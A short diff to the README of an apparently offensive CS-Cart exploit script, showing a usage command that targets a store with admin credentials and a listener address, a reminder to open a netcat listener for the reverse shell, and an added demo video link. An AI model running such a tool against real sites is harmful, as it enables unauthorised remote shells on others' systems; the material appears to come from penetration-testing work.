@@ -23,5 +23,8 @@ options:
 ❯ python3 Cs-Cart.py -U http://192.168.199.39 -u admin -p admin -L 192.168.45.161 -P 443
 ```
 ![cs-cart1](https://github.com/user-attachments/assets/48651990-ed48-4bc6-b407-9922bedd2db4)
-
 **[!] Do not forget to open a netcat listener on the port specified in the exploit to recieved the revershell.**
+## VIDEO:
+[CS-Cart Exploit.webm](https://github.com/user-attachments/assets/19bc2a4b-3c0e-4b94-961c-3ae5f628605f)
+
+
